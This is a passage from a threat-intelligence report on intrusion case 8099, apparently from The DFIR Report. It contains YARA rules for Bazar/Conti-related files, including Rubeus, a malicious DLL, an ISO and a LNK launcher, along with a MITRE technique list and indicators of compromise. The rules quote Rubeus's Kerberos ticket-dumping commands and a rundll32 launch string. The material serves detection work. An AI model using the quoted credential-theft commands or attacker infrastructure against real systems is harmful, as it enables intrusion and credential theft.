      $s5 = "#s+r+y+x/o#k,q$l$t%q0x$u.s*j,s0l(r&r,u0y*p%s!y-y%v'l&v%l%o-q+o%s!k-m)l!p-n!r(q(l.t)p\"o+s%k&v'j*v#w&y/n&q&w&v'm)s\"r#n/v*w/j*l\"" ascii
      $s6 = "%y&u&x!s%k%t%j%m\"p&m&k%o%n\"m%l&v%t%s\"r%q&u%y,l/o)u+p0q)y)p)q)r-y)m+x-o,u,t/u*s,n+l+k0j,t,m+q+t0w,o,x+v+y0t,y)o*k*j-q*x)j*p*o-" ascii
      $s7 = "-r#u&p.w+l#r,o%w%x%y$n%y-j,u$y(y,s,r,y$w%n-n%v-q)l%l%q%p-r!o/n+k\"r,q)q#r!s(o%l#p&s\"r.n*q&q.k*u#y+s\"j(n*o\"o)w*t)s%k#r/l,w#w'u" ascii
      $s8 = ",j/j#t(v+l#s.s%w%x%y0x$o%v%u-x,j0t$j/m+n%l$k!k\"l+t-q!p-x&y+v/l%q%s%r0n'v%w%v&m,u$w+y+r+s*s*r*q*p*o*n*m*l*k*j+y+x+w+v+u+t+s!l!w'" ascii
      $s9 = ",n0m%s$s(j0n(q#m*v0p.x0q't0w)v)x)y/m-s(y%o&m%n,w0t/l#x(r*k+p)k%p0k,v(k$w!t%j*w#x,k(o!y%y#w,j\"l&s(w%r!n*t0l0p%v#y+p+s)q%o%p$m'j0" ascii
      $s10 = "(l/j#l0u$t/n$x0y!p0n$v(k&w,p,t,t,s$w(y-u*u!o,q%m%k%j,r&m0l.s%t%t,p)u-v,o&s$j)s+w%n0l-t&q&o/w%y&t&s&r.n)x,o)t.p*w*x)u%y/m*m\"j'j#" ascii
      $s11 = "/k#u'u)x0l'y(y0t$l&v*y%s+j$t#p,t,s$w(y-u,o%m&p0p.w%j%q+w%q(q)u-y)s$v%m-o)o+n!l-t+x+y.n*x+t,y&s's*s\"j.v*t(o*y+y#t/l)v%y&o,q*u(x$" ascii
      $s12 = "&q+v.s)m/v#y%w,q,x$o/q,q,o,n,n!n0n.y0u$o%t%m)t%w-o%p%p%p%o,u)l%o-v(k%x%x%w)u\"p)o+x+x&q&p,v+u&u&t&s.m&n\"u.p*u&j,j)s0p+o*s*t#v/x" ascii
      $s13 = "+s+r/q*o*j0l,y,j,k-n+w0x$r,k.x,p,u,r0q)o%o-r%w-k(x%j$l%y!w-y)n+l$p\"q%y%x.w0o&y&l&k&j,y0x%q&n&u\"l.l*m,q)x*y+m*v#t/t$v%m&x#w/q+y" ascii
      $s14 = "+s%j/t)s+w+v(y!u,j,j,q,p&w)x*v,t,s(n(m0p$p,s,x+p%m%j)n!x-x%k,p+x%u%r!m#w)y!k&j*l\"m&y%q&l*o\"v.j*u+t&q#j&y*x*j+y#t/l)v&y/w,n#v/p" ascii
      $s15 = "/v*u'y*w(y*y(t&t-x%y%r%s0w$q(y)l(t(n(m0p$x&j'u0u&p%j%q%p+w\"n)l%t%s-w)y$t%t0o&p&l&k&j*t(y\"n/v&t&t&s&r/o%s&s&v+m#m/v#r'p)x#t*t*n" ascii
      $s16 = "'s%k/m&k&l&m0u$s(m0s*n(n0v)y(r-w,y%u,j.k,y&q'r!t-t)t%r\"k)o!o0l&t%s%r%y!x-q*u$o&w#l)r&p&s/u*p$w&o'm(r*y&k.s)x\"q'q#s*y+p/v(n#w*n" ascii
      $s17 = "\"k+m+y+x+w'y(y0t$l&v*y0t$x(w$j0m-s&j(l%k%l%m-p)l$n&p!x#o!n$n!q-q&v\"t%j%t%w!o.r*u\"s*k,q&k\"q+u%y%t\"k.u*u(p*x*j+y#t/r$v%m'x#w/" ascii
      $s18 = "(k%m+w*w(p#s'r-p+n&r0t-o%t%u$l+l&k!x-v%k%l(u%m%u%k%j%q-o)x,u-j)o+k't,j,k,l-q*j,s%l,r-t#o+t+u*v&t&j&r&y&x,o/p\"t*w*x/m+y*s#w/y$q%" ascii
      $s19 = "$t#j/v)l%w#n0j!u'k(j$y0w+v!j%r%s,j%k(n!j's%y.k%t)t%m\"q0s-n)q#y!r!s%j)l&v!s$q\"r'x0y&r*v&w!o0v)x!v\"r\"r&q*w(x!v#m+k!l#j+n%o#k#n" ascii
      $s20 = "#t%n)y/q#p(n$r%j0r)u(y-l+o0v$j's&k)t&q%k%l$s)m%w-n0l%q%p%o0v.r'x!j.t,r+j-j(j%o.s%l*k+r&l+t*p.j*w*r,j%j&w+o&y,n&u$l'n\"t(p#w/y+j)" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      ( pe.imphash() == "1a4ea0d6f08424c00bbeb4790cdf1ca7" and ( pe.exports("GhlqallxvchxEpmvydvyzqt") and pe.exports("PyflzyhnwVkaNixwdqktzn") ) or 8 of them )
}

rule files_Rubeus {
   meta:
      description = "8099 - file Rubeus.exe"
      author = "The DFIR Report"
      reference = "https://thedfirreport.com"
      date = "2021-12-12"
      hash1 = "0e09068581f6ed53d15d34fff9940dfc7ad224e3ce38ac8d1ca1057aee3e3feb"
   strings:
      $x1 = "        Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap]" fullword wide
      $x2 = "        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH" wide
      $x3 = "[!] GetSystem() - OpenProcessToken failed!" fullword wide
      $x4 = "        Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" [/show]" fullword wide
      $x5 = "[!] GetSystem() - ImpersonateLoggedOnUser failed!" fullword wide
      $x6 = "[X] You need to have an elevated context to dump other users' Kerberos tickets :( " fullword wide
      $x7 = "[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'" fullword wide
      $x8 = "    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:" fullword wide
      $s9 = "Z:\\Agressor\\github.com-GhostPack\\Rubeus-master\\Rubeus\\obj\\Debug\\Rubeus.pdb" fullword ascii
      $s10 = "    Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service:" fullword wide
      $s11 = "[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi" fullword wide
      $s12 = "Action: Dump Kerberos Ticket Data (All Users)" fullword wide
      $s13 = "[*] Initializing Kerberos GSS-API w/ fake delegation for target '{0}'" fullword wide
      $s14 = "[*] Listing statistics about target users, no ticket requests being performed." fullword wide
      $s15 = "[X] OpenProcessToken error: {0}" fullword wide
      $s16 = "[X] CreateProcessWithLogonW error: {0}" fullword wide
      $s17 = "[*] Target service  : {0:x}" fullword wide
      $s18 = "[*] Target Users           : {0}" fullword wide
      $s19 = "        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.K" wide
      $s20 = "    List all current tickets in detail (if elevated, list for all users), optionally targeting a specific LUID:" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule SharedFiles {
   meta:
      description = "8099 - file SharedFiles.dll"
      author = "The DFIR Report"
      reference = "https://thedfirreport.com"
      date = "2021-12-12"
      hash1 = "c17e71c7ae15fdb02a4e22df4f50fb44215211755effd6e3fc56e7f3e586b299"
   strings:
      $s1 = "ButtonSkin.dll" fullword wide
      $s2 = "MyLinks.dll" fullword wide
      $s3 = "DragListCtrl.dll" fullword ascii
      $s4 = "whoami.exe" fullword ascii
      $s5 = "constructor or from DllMain." fullword ascii
      $s6 = "DINGXXPADDINGPADDINGXXPADDINGPADD" fullword ascii
      $s7 = "kLV -{T" fullword ascii
      $s8 = "CtrlList1" fullword wide
      $s9 = "CtrlList2" fullword wide
      $s10 = "CtrlList3" fullword wide
      $s11 = "wox)YytbACl_<me*y3X(*lNCvY@8jsbePLfVHH!X2p2TdHa6+1hoo^1N7gNtwhki)Lbaso@*ne7" fullword ascii
      $s12 = "QX[gbL" fullword ascii /* Goodware String - occured 1 times */
      $s13 = "BasicScore" fullword ascii
      $s14 = ".?AVCDemoDlg@@" fullword ascii
      $s15 = "jLDfSektRC2FrOiWNzhbH3AsmBEIwg1U" fullword ascii
      $s16 = "9t$xt5" fullword ascii /* Goodware String - occured 1 times */
      $s17 = "DeAj1=n" fullword ascii
      $s18 = "WmaK|IG" fullword ascii
      $s19 = "oTRHz`R" fullword ascii
      $s20 = "VWATAUAVAWLc" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      ( pe.imphash() == "c270086ea8ef591ab09b6ccf85dc6072" and pe.exports("BasicScore") or 8 of them )
}

rule new_documents_2005_iso {
   meta:
      description = "8099 - file new-documents-2005.iso"
      author = "The DFIR Report"
      reference = "https://thedfirreport.com"
      date = "2021-11-29"
      hash1 = "1de1336e311ba4ab44828420b4f876d173634670c0b240c6cca5babb1d8b0723"
   strings:
      $x1 = "SharedFiles.dll,BasicScore\"%systemroot%\\system32\\imageres.dll" fullword wide
      $s2 = "C:\\Windows\\System32\\rundll32.exe" fullword ascii
      $s3 = "SHAREDFI.DLL" fullword ascii
      $s4 = "SharedFiles.dll" fullword wide
      $s5 = "C:\\Users\\User\\Documents" fullword wide
      $s6 = "DragListCtrl.dll" fullword ascii
      $s7 = "MyLinks.dll" fullword wide
      $s8 = "ButtonSkin.dll" fullword wide
      $s9 = "whoami.exe" fullword ascii
      $s10 = " ..\\Windows\\System32\\rundll32.exe" fullword wide
      $s11 = "User (C:\\Users)" fullword wide
      $s12 = "        " fullword ascii
      $s13 = "DOCUMENT.LNK" fullword ascii
      $s14 = "Documents.lnk@" fullword wide
      $s15 = ",System32" fullword wide
      $s16 = " Type Descriptor'" fullword ascii
      $s17 = " constructor or from DllMain." fullword ascii
      $s18 = "  " fullword ascii
      $s19 = "DINGXXPADDINGPADDINGXXPADDINGPADD" fullword ascii
      $s20 = " Class Hierarchy Descriptor'" fullword ascii
   condition:
      uint16(0) == 0x0000 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule files_tmp {
   meta:
      description = "8099 - file tmp.dll"
      author = "The DFIR Report"
      reference = "https://thedfirreport.com"
      date = "2021-12-12"
      hash1 = "493a1fbe833c419b37bb345f6f193517d5d9fd2577f09cc74b48b49d7d732a54"
   strings:
      $s1 = "UncategorizedOtherOutOfMemoryUnexpectedEofInterruptedArgumentListTooLongFilenameTooLongTooManyLinksCrossesDevicesDeadlockExecuta" ascii
      $s2 = "uncategorized errorother errorout of memoryunexpected end of fileunsupportedoperation interruptedargument list too longfilename " ascii
      $s3 = "kuiiqaiusmlytqxxnrtl.dll" fullword ascii
      $s4 = "Node.js API crypto.randomFillSync is unavailableNode.js crypto module is unavailablerandSecure: VxWorks RNG module is not initia" ascii
      $s5 = "ctoryoperation would blockentity already existsbroken pipenetwork downaddress not availableaddress in usenot connectedconnection" ascii
      $s6 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s7 = "keyed events not availableC:rtzkoqhrehbskobagkzngetniywbivatkcfmkxxumjxevfohiuxtzrkjoopvcwassaovngxtdmzbhlhkgasumqlldyupsmjyztrd" ascii
      $s8 = "keyed events not availableC:rtzkoqhrehbskobagkzngetniywbivatkcfmkxxumjxevfohiuxtzrkjoopvcwassaovngxtdmzbhlhkgasumqlldyupsmjyztrd" ascii
      $s9 = "attempted to index slice from after maximum usizeattempted to index slice up to maximum usizeassertion failed: mid <= self.len()" ascii
      $s10 = "attempted to zero-initialize type `alloc::string::String`, which is invalidassertion failed: 0 < pointee_size && pointee_size <=" ascii
      $s11 = "attempted to zero-initialize type `&str`, which is invalidassertion failed: 0 < pointee_size && pointee_size <= isize::MAX as us" ascii
      $s12 = "attempted to zero-initialize type `&str`, which is invalidassertion failed: 0 < pointee_size && pointee_size <= isize::MAX as us" ascii
      $s13 = "rno: did not return a positive valuegetrandom: this target is not supportedC:ehpgbcedommleqfhulhfnkiqvffztwzvxtvorsmuwrtkmtsqdfl" ascii
      $s14 = "attempted to zero-initialize type `(*mut u8, unsafe extern \"C\" fn(*mut u8))`, which is invalidassertion failed: 0 < pointee_si" ascii
      $s15 = "attempted to index slice from after maximum usizeattempted to index slice up to maximum usizeassertion failed: mid <= self.len()" ascii
      $s16 = "attempted to zero-initialize type `alloc::string::String`, which is invalidassertion failed: 0 < pointee_size && pointee_size <=" ascii
      $s17 = "workFileHandleFilesystemLoopReadOnlyFilesystemDirectoryNotEmptyIsADirectoryNotADirectoryWouldBlockAlreadyExistsBrokenPipeNetwork" ascii
      $s18 = "abortednetwork unreachablehost unreachableconnection resetconnection refusedpermission deniedentity not foundErrorkind" fullword ascii
      $s19 = "thread panicked while processing panic. aborting." fullword ascii
      $s20 = "internal_codedescription0" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      ( pe.imphash() == "59e16a2afa5b682bb9692bac873fa10c" and ( pe.exports("EnterDll") and pe.exports("alpjxriee") and pe.exports("arcfqsbobtwbjrf") and pe.exports("asblsmvdudmlwht") and pe.exports("bgttsajxwgwrsai") and pe.exports("bosaplw") ) or 8 of them )
}

rule Documents {
   meta:
      description = "8099 - file Documents.lnk"
      author = "The DFIR Report"
      reference = "https://thedfirreport.com"
      date = "2021-12-12"
      hash1 = "e87f9f378590b95de1b1ef2aaab84e1d00f210fd6aaf5025d815f33096c9d162"
   strings:
      $x1 = "SharedFiles.dll,BasicScore\"%systemroot%\\system32\\imageres.dll" fullword wide
      $x2 = "C:\\Windows\\System32\\rundll32.exe" fullword ascii
      $s3 = "C:\\Users\\User\\Documents" fullword wide
      $s4 = " ..\\Windows\\System32\\rundll32.exe" fullword wide
      $s5 = "User (C:\\Users)" fullword wide
      $s6 = ",System32" fullword wide
      $s7 = "Documents" fullword wide /* Goodware String - occured 89 times */
      $s8 = "windev2106eval" fullword ascii
      $s9 = "%Windows" fullword wide /* Goodware String - occured 2 times */
      $s10 = "OwHUSx" fullword ascii
      $s11 = "System Folder" fullword wide /* Goodware String - occured 5 times */
   condition:
      uint16(0) == 0x004c and filesize < 3KB and
      1 of ($x*) and all of them
}


```

#### MITRE


* Spearphising Link – T1566.002
* BITS Jobs – T1197
* Kerberoasting – T1558.003
* AS-REP Roasting – T1558.004
* Credentials in Registry – T1552.002
* Remote Desktop Protocol – T1021.001
* Exfiltration to Cloud Storage – T1567.002
* OS Credential Dumping – T1003
* SMB/Windows Admin Shares – T1021.002
* System Owner/User Discovery – T1033
* Network Service Scanning – T1046
* Process Injection – T1055
* PowerShell – T1059.001
* Domain Groups – T1069.002
* File and Directory Discovery – T1083
* Access Token Manipulation – T1134
* Network Share Discovery – T1135
* Domain Trust Discovery – T1482
* Data Encrypted for Impact – T1486
* Disable or Modify Tools – T1562.001
* Valid Accounts – T1078


Internal case #8099






## Tags:

#### Threatactor:
[[threatactor.name=BRONZE BUTLER]] [[threatactor.name=Wizard Spider]]

#### Action:
[[action.malware.name=AdFind]] [[action.malware.name=Arp]] [[action.malware.name=at]] [[action.malware.name=at]] [[action.malware.name=Bazar]] [[action.malware.name=cmd]] [[action.malware.name=cmd]] [[action.malware.name=Cobalt Strike]] [[action.malware.name=Conti]] [[action.malware.name=Empire]] [[action.malware.name=FTP]] [[action.malware.name=ipconfig]] [[action.malware.name=Net]] [[action.malware.name=Net]] [[action.malware.name=njRAT]] [[action.malware.name=Nltest]] [[action.malware.name=Ping]] [[action.malware.name=Ping]] [[action.malware.name=PoshC2]] [[action.malware.name=PS1]] [[action.malware.name=PS1]] [[action.malware.name=Reg]] [[action.malware.name=Reg]] [[action.malware.name=Ryuk]] [[action.malware.name=S-Type]] [[action.malware.name=Systeminfo]] [[action.malware.name=Systeminfo]] [[action.malware.name=Tasklist]] [[action.malware.name=Tor]]

#### Location:
[[victim.country.name=Mali]] [[victim.continent.name=Africa]] [[victim.country.name=Oman]] [[victim.continent.name=Asia]] [[victim.city.name=]] [[victim.country.name=Haiti]] [[victim.continent.name=North and Central America]]

### Autogenerated Tags:
[[Reg.exe]] [[Bazarloader]] [[Dll]] [[Rdp]] [[Hkcu\software\classes\ms-settings\shell\open\command]] [[/f]] [[Ransomware]] [[Anydesk]] [[Malware]] [[Onedrive]] [[The DFIR Report]]
#### ipv4-adresses
159.223.31.75 206.189.49.239 23.106.215.31 108.62.141.87 23.81.246.32 192.52.167.210
#### ipv6-adresses
3d:c3:4b:ff:95:d0:ae:52ae: f3:1e:18:e2:18:9e:0b:380b: be:b3:98:a3:a2:ce:e0:63e0: 0b:7a:02:34:13:5b:0a:b50a: a5:4e:ed:32:cd:76:a3:97a3: 6b:ad:a1:df:42:36:6d:386d: 32:be:aa:28:c6:bc:f3:f6f3: cf:31:c5:e5:2a:bf:1a:c11a: :::
#### email-adresses
goodmanshannon@stewart-cook.com
#### urls
athletehttps://t.co/Hkg0UCBK85 http://download.anydesk.com/AnyDesk.exe www.hiduwu.com www.gawocag.com https://thedfirreport.com
#### MITRE IDs
[[T1566.002]] [[T1558.003]] [[T1558.004]] [[T1552.002]] [[T1021.001]] [[T1567.002]] [[T1021.002]] [[T1059.001]] [[T1069.002]] [[T1562.001]]

